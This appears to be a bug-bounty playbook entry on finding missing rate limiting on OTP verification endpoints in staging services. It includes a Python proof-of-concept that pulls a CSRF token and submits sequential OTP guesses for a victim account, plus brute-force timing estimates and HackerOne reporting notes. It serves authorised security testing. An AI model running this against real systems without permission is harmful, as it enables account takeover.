# OTP Brute-Force Pattern (Staging Services)

## Trigger
- Target has OTP-based authentication (email/SMS + 6-digit code)
- Staging/dev services often have weaker rate limiting than production
- Look for `/otp`, `/otpcheck`, `/verify-otp`, `/auth/otp` endpoints

## Discovery Pattern (from Grab/OVO engagement 2026-05-26)

1. **Find staging service** via config.js leak or subdomain enumeration
2. **Identify auth flow** — check login.js or main bundle for endpoint names
3. **Get CSRF token** — SPA apps using csurf middleware store token in `<meta>` tag, NOT the cookie value
4. **Test OTP send** — field name may not be `email` (was `identifier` in OVO Rampart)
5. **Test rate limiting on VERIFICATION endpoint** (not send endpoint)

## Key Insight

Rate limiting often exists on OTP SENDING (`/otp`) but NOT on OTP VERIFICATION (`/otpcheck`). Developers protect against spam but forget brute-force on the check endpoint.

## PoC Template

```python
import requests
import re

TARGET = "https://target-staging.example.com"

# Step 1: Get session + CSRF
session = requests.Session()
r = session.get(TARGET)
csrf_metas = [m for m in re.findall(r'<meta[^>]+>', r.text) if 'csrf' in m.lower()]
csrf_token = re.search(r'content=["\']([^"\']+)["\']', csrf_metas[0]).group(1)
HEADERS = {"Content-Type": "application/json", "X-CSRF-Token": csrf_token}

# Step 2: Send OTP
resp = session.post(f"{TARGET}/otp", headers=HEADERS,
                   json={"identifier": "victim@company.com"})
print(f"OTP sent: {resp.text}")

# Step 3: Verify no rate limit (probe 100 attempts)
for i in range(100):
    otp = f"{i:06d}"
    resp = session.post(f"{TARGET}/otpcheck", headers=HEADERS,
                       json={"identifier": "victim@company.com", "otp": otp})
    if resp.status_code == 429:
        print(f"Rate limited at attempt {i+1}")
        break
    if "invalid" not in resp.text.lower():
        print(f"Different response at {i+1}: {resp.text}")
        break
else:
    print("NO RATE LIMIT — brute-forceable!")
```

## Feasibility Calculation

| OTP Length | Combinations | @50 req/s (1 session) | @500 req/s (10 sessions) |
|-----------|-------------|----------------------|--------------------------|
| 4 digits  | 10,000      | 3.3 minutes          | 20 seconds               |
| 6 digits  | 1,000,000   | 5.5 hours            | 33 minutes               |
| 8 digits  | 100,000,000 | 23 days              | 2.3 days                 |

## CSRF Token Patterns (csurf/Express middleware)

- Cookie: `_csrf` — this is the SECRET, not the token
- Meta tag: `<meta name="csrf-token" content="ACTUAL_TOKEN">` — use THIS in X-CSRF-Token header
- The token is derived from the cookie secret but they are NOT the same value
- Must send both: cookie (automatic via session) + header token (from meta)

## Field Name Discovery

If the endpoint returns "identifier_required" or similar, the field name isn't standard. Try:
`identifier`, `username`, `login`, `email`, `phone`, `mobile`, `user`, `account`

## Reporting Notes

- Severity: HIGH on HackerOne (authentication bypass)
- Always calculate brute-force time with parallel sessions
- Note what IS rate-limited (send) vs what ISN'T (verify) — shows partial implementation
- If OTP accepts any email (no user validation), note this as additional issue (user enumeration bypass)
